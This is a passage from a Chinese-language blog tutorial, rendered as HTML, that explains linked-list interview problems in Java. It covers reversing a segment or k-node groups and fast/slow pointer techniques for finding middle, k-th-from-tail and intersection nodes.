class="keyword">int</span> toIndex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    Node fromPre = <span class="keyword">null</span>;            <span class="comment">// from-1结点</span></span><br><span class="line">    Node from = <span class="keyword">null</span>;               <span class="comment">// from 结点</span></span><br><span class="line">    Node to = <span class="keyword">null</span>;                 <span class="comment">// to 结点</span></span><br><span class="line">    Node toNext = <span class="keyword">null</span>;             <span class="comment">// to+1 结点</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 步骤 1：找到 from-1，from，to，to+1 这四个结点</span></span><br><span class="line">    Node tmp = head.next;</span><br><span class="line">    <span class="keyword">int</span> curIndex = <span class="number">1</span>;      <span class="comment">// 头结点的index为1</span></span><br><span class="line">    <span class="keyword">while</span> (tmp != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (curIndex == fromIndex-<span class="number">1</span>) &#123;</span><br><span class="line">            fromPre = tmp;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (curIndex == fromIndex) &#123;</span><br><span class="line">            from = tmp;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (curIndex == toIndex) &#123;</span><br><span class="line">            to = tmp;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (curIndex == toIndex+<span class="number">1</span>) &#123;</span><br><span class="line">            toNext = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        tmp = tmp.next;</span><br><span class="line">        curIndex++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (from == <span class="keyword">null</span> || to == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// from 或 to 都超过尾结点不翻转</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"不符合条件"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 步骤2：以下使用循环迭代法翻转从 from 到 to 的结点</span></span><br><span class="line">    Node pre = from;</span><br><span class="line">    Node cur = pre.next;</span><br><span class="line">    <span class="keyword">while</span> (cur != toNext) &#123;</span><br><span class="line">        Node next = cur.next;</span><br><span class="line">        cur.next = pre;</span><br><span class="line">        pre = cur;</span><br><span class="line">        cur = next;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 步骤3：将 from-1 节点指向 to 结点（如果从 head 的后继结点开始翻转，则需要重新设置 head 的后继结点），将 from 结点指向 to + 1 结点</span></span><br><span class="line">    <span class="keyword">if</span> (fromPre != <span class="keyword">null</span>) &#123;</span><br><span class="line">        fromPre.next = to;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        head.next = to;</span><br><span class="line">    &#125;</span><br><span class="line">    from.next = toNext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<blockquote>
<p>&emsp;&emsp;变形题 2：给出一个链表，每 k 个节点一组进行翻转，并返回翻转后的链表。k 是一个正整数，它的值小于或等于链表的长度。如果节点总数不是 k 的整数倍，那么将最后剩余节点保持原有顺序。</p>
</blockquote>
<p>&emsp;&emsp;示例：给定这个链表：<code>head --&gt; 1 --&gt; 2 --&gt; 3 --&gt; 4 --&gt; 5</code>，当 k = 2 时，应当返回：<code>head --&gt; 2 --&gt; 1 --&gt; 4 --&gt; 3 --&gt; 5</code>；当 k = 3 时，应当返回：<code>head --&gt; 3 --&gt; 2 --&gt; 1 --&gt; 4 --&gt; 5</code>。说明：</p>
<ul>
<li>你的算法只能使用常数的额外空间；</li>
<li>你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。</li>
</ul>
<p>&emsp;&emsp;这道题是 LeetCode 的原题，属于 hard 级别，如果这一题你懂了，那对链表的翻转应该基本没问题了，有了之前的翻转链表基础，相信这题不难。  </p>
<p>&emsp;&emsp;只要我们能找到翻一组 k 个结点的方法，问题就解决了（之后只要重复对 k 个结点一组的链表进行翻转即可）。  </p>
<p>&emsp;&emsp;接下来，我们以以下链表为例：</p>
<figure class="image-box">
                <img src="21.webp" alt title class>
                <p></p>
            </figure>

<p>来看看怎么翻转 3 个一组的链表（此例中 k = 3）：</p>
<ol>
<li><p>首先，我们要记录 3 个一组这一段链表的前继结点，定义为 startKPre，然后再定义一个 step，从这一段的头结点(1）开始遍历 2 次，找出这段链表的起始和终止结点，如下图示：</p>
<figure class="image-box">
                <img src="22.gif" alt title class>
                <p></p>
            </figure>
</li>
<li><p>找到 startK 和 endK 之后，根据之前的迭代翻转法对 startK 和 endK 的这段链表进行翻转。</p>
<figure class="image-box">
                <img src="23.webp" alt title class>
                <p></p>
            </figure>
</li>
<li><p>然后将 startKPre 指向 endK，将 startK 指向 endKNext，即完成了对 k 个一组结点的翻转。</p>
<figure class="image-box">
                <img src="24.webp" alt title class>
                <p></p>
            </figure>

</li>
</ol>
<p>&emsp;&emsp;知道了一组 k 个怎么翻转，之后只要重复对 k 个结点一组的链表进行翻转即可，对照图示看如下代码应该还是比较容易理解的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 每 k 个一组翻转链表</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> k</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">iterationInvertLinkedListEveryK</span><span class="params">(<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    Node tmp = head.next;</span><br><span class="line">    <span class="keyword">int</span> step = <span class="number">0</span>;               <span class="comment">// 计数，用来找出首结点和尾结点</span></span><br><span class="line"></span><br><span class="line">    Node startK = <span class="keyword">null</span>;         <span class="comment">// k个一组链表中的头结点</span></span><br><span class="line">    Node startKPre = head;      <span class="comment">// k个一组链表头结点的前置结点</span></span><br><span class="line">    Node endK;                  <span class="comment">// k个一组链表中的尾结点</span></span><br><span class="line">    <span class="keyword">while</span> (tmp != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// tmp 的下一个节点，因为由于翻转，tmp 的后继结点会变，要提前保存</span></span><br><span class="line">        Node tmpNext = tmp.next;</span><br><span class="line">        <span class="keyword">if</span> (step == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// k 个一组链表区间的头结点</span></span><br><span class="line">            startK = tmp;</span><br><span class="line">            step++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (step == k-<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 此时找到了 k 个一组链表区间的尾结点（endK），对这段链表用迭代进行翻转</span></span><br><span class="line">            endK = tmp;</span><br><span class="line">            Node pre = startK;</span><br><span class="line">            Node cur = startK.next;</span><br><span class="line">            <span class="keyword">if</span> (cur == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Node endKNext = endK.next;</span><br><span class="line">            <span class="keyword">while</span> (cur != endKNext) &#123;</span><br><span class="line">                Node next = cur.next;</span><br><span class="line">                cur.next = pre;</span><br><span class="line">                pre = cur;</span><br><span class="line">                cur = next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 翻转后此时 endK 和 startK 分别是是 k 个一组链表中的首尾结点</span></span><br><span class="line">            startKPre.next = endK;</span><br><span class="line">            startK.next = endKNext;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 当前的 k 个一组翻转完了，开始下一个 k 个一组的翻转</span></span><br><span class="line">            startKPre = startK;</span><br><span class="line">            step = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            step++;</span><br><span class="line">        &#125;</span><br><span class="line">        tmp = tmpNext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;时间复杂度是多少呢，对链表从头到尾循环了 n 次，同时每 k 个结点翻转一次，可以认为总共翻转了 n 次，所以时间复杂度是 <code>O(2n)</code>，去掉常数项，即为 <code>O(n)</code>。 注：这题时间复杂度比较误认为是 <code>O(k * n)</code>，实际上并不是每一次链表的循环都会翻转链表，只是在循环链表元素每 k 个结点的时候才会翻转。</p>
<hr>
<blockquote>
<p>&emsp;&emsp;变形 3：变形 2 针对的是顺序的 k 个一组翻转，那如何逆序 k 个一组进行翻转呢？</p>
</blockquote>
<p>&emsp;&emsp;例如：给定如下链表，<code>head --&gt; 1 --&gt; 2 --&gt; 3 --&gt; 4 --&gt; 5</code>，逆序 k 个一组翻转后，链表变成（k = 2 时）<code>head --&gt; 1 --&gt; 3 --&gt; 2 --&gt; 5 --&gt; 4</code>。  </p>
<p>&emsp;&emsp;这道题是字节跳动的面试题，确实够变态的，顺序 k 个一组翻转都已经属于 hard 级别了，逆序 k 个一组翻转更是属于 super hard 级别了，不过其实有了之前知识的铺垫，应该不难，只是稍微变形了一下，只要对链表做如下变形即可：</p>
<figure class="image-box">
                <img src="25.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;代码的每一步其实都是用了我们之前实现好的函数，所以我们之前做的每一步都是有伏笔的哦！就是为了解决字节跳动这道终极面试题！</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 逆序每 k 个一组翻转链表</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> k</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverseIterationInvertLinkedListEveryK</span><span class="params">(<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 先翻转链表</span></span><br><span class="line">    iterationInvertLinkedList();</span><br><span class="line">    <span class="comment">// k 个一组翻转链表</span></span><br><span class="line">    iterationInvertLinkedListEveryK(k);</span><br><span class="line">    <span class="comment">// 再次翻转链表</span></span><br><span class="line">    iterationInvertLinkedList();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;由此可见，掌握基本的链表翻转非常重要！难题多是在此基础了做了相应的变形而已。</p>
<h1 id="链表解题利器-——-快慢指针"><a href="#链表解题利器-——-快慢指针" class="headerlink" title="链表解题利器 —— 快慢指针"></a>链表解题利器 —— 快慢指针</h1><p>&emsp;&emsp;快慢指针在面试中出现的概率也很大，也是务必要掌握的一个要点，本文总结了市面上常见的快慢指针解题技巧，相信看完后此类问题能手到擒来。本文将详细讲述如何用快慢指针解决以下两大类问题：</p>
<ol>
<li>寻找/删除第 K 个结点；</li>
<li>有关链表环问题的相关解法。</li>
</ol>
<h2 id="寻找-删除第-K-个结点"><a href="#寻找-删除第-K-个结点" class="headerlink" title="寻找/删除第 K 个结点"></a>寻找/删除第 K 个结点</h2><h3 id="小试牛刀之一"><a href="#小试牛刀之一" class="headerlink" title="小试牛刀之一"></a>小试牛刀之一</h3><blockquote>
<p>&emsp;&emsp;LeetCode 876：给定一个带有头结点 head 的非空单链表，返回链表的中间结点。如果有两个中间结点，则返回第二个中间结点。</p>
</blockquote>
<h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>&emsp;&emsp;要知道链表的中间结点，首先我们需要知道链表的长度，说到链表长度大家想到了啥，还记得我们在<a href="https://mp.weixin.qq.com/s?__biz=MzI5MTU1MzM3MQ==&mid=2247483885&idx=1&sn=512617e34872e7e9ca90556d54af0f1d&scene=21#wechat_redirect" target="_blank" rel="noopener">上文</a>中说过哨兵结点可以保存链表的长度吗，这样直接 <strong>从 head 的后继结点</strong> 开始遍历 <strong>链表长度 / 2</strong> 次即可找到中间结点。为啥中间结点是 链表长度 / 2 ，我们仔细分析一下：</p>
<ol>
<li>假如链表长度是奇数：<code>head --&gt; 1 --&gt; 2 --&gt; 3 --&gt; 4 --&gt; 5</code>，从 1 开始遍历 5 / 2 = 2（取整）次，到达 3，3 确实是中间结点；</li>
<li>假如链表长度是偶数：<code>head --&gt; 1 --&gt; 2 --&gt; 3 --&gt; 4 --&gt; 5 --&gt; 6</code>，从 1 开始遍历 6 / 2 = 3 次，到达 4，4 确实是中间结点的第二个结点。</li>
</ol>
<blockquote>
<p>画外音：多画画图，举举例，能看清事情的本质！</p>
</blockquote>
<p>&emsp;&emsp;哨后结点的长度派上用场了，这种方式最简单，直接上代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Node <span class="title">findMiddleNode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Node tmp = head.next;</span><br><span class="line">    <span class="keyword">int</span> middleLength = length / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> (middleLength &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        tmp = tmp.next;</span><br><span class="line">        middleLength--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>&emsp;&emsp;如果哨兵结点里没有定义长度呢，那就要遍历一遍链表拿到链表长度（定义为 length）了，然后再从头结点开始遍历 <code>length / 2</code> 次即为中间结点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Node <span class="title">findMiddleNodeWithoutHead</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Node tmp = head.next;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 选遍历一遍拿到链表长度</span></span><br><span class="line">    <span class="keyword">while</span> (tmp.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        tmp = tmp.next;</span><br><span class="line">        length++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再遍历一遍拿到链表中间结点</span></span><br><span class="line">    tmp = head.next;</span><br><span class="line">    <span class="keyword">int</span> middleLength = length / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> (middleLength &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        tmp = tmp.next;</span><br><span class="line">        middleLength--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h4><p>&emsp;&emsp;解法二由于要遍历两次链表，显得不是那么高效，那能否只遍历一次链表就能拿到中间结点呢。  </p>
<p>&emsp;&emsp;这里就引入我们的快慢指针了，主要有三步 1、快慢指针同时指向 head 的后继结点；2、慢指针走一步，快指针走两步；3、不断地重复步骤 2，什么时候停下来呢，这取决于链表的长度是奇数还是偶数。</p>
<ul>
<li><p>如果链表长度为奇数，当 <code>fast.next = null</code> 时，slow 为中间结点。</p>
<figure class="image-box">
                <img src="26.gif" alt title class>
                <p></p>
            </figure>
</li>
<li><p>如果链表长度为偶数，当 <code>fast = null</code> 时，slow 为中间结点。</p>
<figure class="image-box">
                <img src="27.gif" alt title class>
                <p></p>
            </figure>

</li>
</ul>
<p>&emsp;&emsp;由以上分析可知：当 <code>fast = null</code> 或者 <code>fast.next = null</code> 时，此时的 slow 结点即为我们要求的中间结点，否则不断地重复步骤 2。知道了思路，代码实现就简单了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用快慢指针查找找到中间结点</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Node <span class="title">findMiddleNodeWithSlowFastPointer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Node slow = head.next;</span><br><span class="line">    Node fast = head.next;</span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 快指针走两步</span></span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        <span class="comment">// 慢指针走一步</span></span><br><span class="line">        slow = slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 此时的 slow 结点即为哨兵结点</span></span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>&emsp;&emsp;有了上面的基础，我们现在再大一下难度，看下下面这道题：</p>
<blockquote>
<p>&emsp;&emsp;输入一个链表，输出该链表中的倒数第 k 个结点。比如链表为 <code>head --&gt; 1 --&gt; 2 --&gt; 3 --&gt; 4 --&gt; 5</code>。求倒数第三个结点（即值为 3 的节点）</p>
</blockquote>
<p>&emsp;&emsp;分析：我们知道如果要求顺序的第 k 个结点还是比较简单的，从 head 开始遍历 k 次即可，如果要求逆序的第 k 个结点，常规的做法是先顺序遍历一遍链表，拿到链表长度，然后再遍历 链表长度 - k 次即可，这样要遍历两次链表，不是那么高效，如何只遍历一次呢，还是用我们的说的快慢指针解法：</p>
<ol>
<li>首先让快慢指针同时指向 head 的后继结点；</li>
<li>快指针往前走 k - 1 步，先走到第 k 个结点；</li>
<li>快慢指针同时往后走一步，不断重复此步骤，直到快指针走到尾结点，此时的 slow 结点即为我们要找的倒序第 k 个结点。</li>
</ol>
<figure class="image-box">
                <img src="28.gif" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;注：需要注意临界情况：k 大于链表的长度，这种异常情况应该<strong>抛异常</strong>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Node <span class="title">findKthToTail</span><span class="params">(<span class="keyword">int</span> k)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Node slow = head.next;</span><br><span class="line">    Node fast = head.next;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 快指针先移到第k个结点</span></span><br><span class="line">    <span class="keyword">int</span> tmpK = k - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (tmpK &gt; <span class="number">0</span> &amp;&amp; fast != <span class="keyword">null</span>) &#123;</span><br><span class="line">        fast = fast.next;</span><br><span class="line">        tmpK--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 临界条件：k大于链表长度</span></span><br><span class="line">    <span class="keyword">if</span> (fast == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"K结点不存在异常"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// slow 和 fast 同时往后移，直到 fast 走到尾结点</span></span><br><span class="line">    <span class="keyword">while</span> (fast.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>&emsp;&emsp;知道了如何求倒序第 k 个结点，再来看看下面这道题：</p>
<blockquote>
<p>&emsp;&emsp;给定一个单链表，设计一个算法实现链表向右旋转 K 个位置。举例： 给定 <code>head --&gt; 1 --&gt; 2 --&gt; 3 --&gt; 4 --&gt; 5 --&gt; NULL</code>，K = 3，右旋后即为 <code>head --&gt; 3 --&gt; 4 --&gt; 5 --&gt; 1 --&gt; 2 --&gt; NULL</code>。</p>
</blockquote>
<p>&emsp;&emsp;分析：这道题其实是对求倒序第 K 个位置的的一个变形，主要思路如下：</p>
<ol>
<li>先找到倒数第 K + 1 个结点，此结点的后继结点即为倒数第 K 个结点；</li>
<li>将倒数第 K + 1 结点的的后继结点设置为 null；</li>
<li>将 head 的后继结点设置为以上所得的倒数第 K 个结点，将原尾结点的后继结点设置为原 head 的后继结点。</li>
</ol>
<figure class="image-box">
                <img src="29.gif" alt title class>
                <p></p>
            </figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reversedKthToTail</span><span class="params">(<span class="keyword">int</span> k)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 直接调已实现的 寻找倒序k个结点的方法，这里是 k+1</span></span><br><span class="line">    Node KPreNode = findKthToTail(k+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 倒数第 K 个结点</span></span><br><span class="line">    Node kNode = KPreNode.next;</span><br><span class="line">    Node headNext = head.next;</span><br><span class="line"></span><br><span class="line">    KPreNode.next = <span class="keyword">null</span>;</span><br><span class="line">    head.next = kNode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 寻找尾结点</span></span><br><span class="line">    Node tmp = kNode;</span><br><span class="line">    <span class="keyword">while</span> (tmp.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        tmp = tmp.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 尾结点的后继结点设置为原 head 的后继结点</span></span><br><span class="line">    tmp.next = headNext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>&emsp;&emsp;有了上面两道题的铺垫，相信下面这道题不是什么难事，限于篇幅关系，这里不展开，大家可以自己试试。</p>
<blockquote>
<p>&emsp;&emsp;输入一个链表，删除该链表中的倒数第 k 个结点。</p>
</blockquote>
<h3 id="小试牛刀之二"><a href="#小试牛刀之二" class="headerlink" title="小试牛刀之二"></a>小试牛刀之二</h3><blockquote>
<p>&emsp;&emsp;判断两个单链表是否相交及找到第一个交点，要求空间复杂度 <code>O(1)</code>。 如图示：如果两个链表相交，5 为这两个链表相交的第一个交点。</p>
</blockquote>
<figure class="image-box">
                <img src="30.webp" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>画外音：如果没有空间复杂度 <code>O(1)</code> 的限制，其实有多种解法，一种是遍历链表 1，将链表 1 的所有的结点都放到一个 set 中，再次遍历链表 2，每遍历一个结点，就判断这个结点是否在 set，如果发现结点在这个 set 中，则这个结点就是链表第一个相交的结点。</p>
</blockquote>
<p>&emsp;&emsp;分析：首先我们要明白，由于链表本身的性质，如果有一个结点相交，那么相交结点之后的所有结点都是这两个链表共用的，也就是说两个链表的长度主要相差在相交结点之前的结点长度，于是我们有以下思路：</p>
<ol>
<li><p>如果链表没有定义长度，则我们先遍历这两个链表拿到两个链表长度，假设分别为 L1，L2（L1 &gt;= L2），定义 p1，p2 指针分别指向各自链表 head 结点，然后 p1 先往前走 <code>L1 - L2</code> 步。这一步保证了 p1，p2 指向的指针与相交结点（如果有的话）一样近。</p>
<figure class="image-box">
                <img src="31.gif" alt title class>
                <p></p>
            </figure>
</li>
<li><p>然后 p1，p2 不断往后遍历，每次走一步，边遍历边判断相应结点是否相等，如果相等即为这两个链表的相交结点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Node <span class="title">detectCommonNode</span><span class="params">(LinkedList list1, LinkedList list2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length1 = <span class="number">0</span>;        <span class="comment">// 链表 list1 的长度</span></span><br><span class="line">    <span class="keyword">int</span> length2 = <span class="number">0</span>;        <span class="comment">// 链表 list2 的长度</span></span><br><span class="line"></span><br><span class="line">    Node p1 = list1.head;</span><br><span class="line">    Node p2 = list2.head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p1.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        length1++;</span><br><span class="line">        p1 = p1.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p2.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        length2++;</span><br><span class="line">        p2 = p2.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p1 = list1.head;</span><br><span class="line">    p2 = list2.head;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// p1 或 p2 前进 |length1-length2| 步</span></span><br><span class="line">    <span class="keyword">if</span> (length1 &gt;= length2) &#123;</span><br><span class="line">        <span class="keyword">int</span> diffLength = length1-length2;</span><br><span class="line">        <span class="keyword">while</span> (diffLength &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            p1 = p1.next;</span><br><span class="line">            diffLength--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> diffLength = length2-length1;</span><br><span class="line">        <span class="keyword">while</span> (diffLength &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            p2 = p2.next;</span><br><span class="line">            diffLength--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// p1，p2分别往后遍历，边遍历边比较，如果相等，即为第一个相交结点</span></span><br><span class="line">    <span class="keyword">while</span> (p1 != <span class="keyword">null</span> &amp;&amp; p2.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        p1 = p1.next;</span><br><span class="line">        p2 = p2.next;</span><br><span class="line">        <span class="keyword">if</span> (p1.data == p2.data) &#123;</span><br><span class="line">            <span class="comment">// p1，p2 都为相交结点，返回 p1 或 p2</span></span><br><span class="line">            <span class="keyword">return</span> p1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 没有相交结点，返回空指针</span></span><br><span class="line">    <span 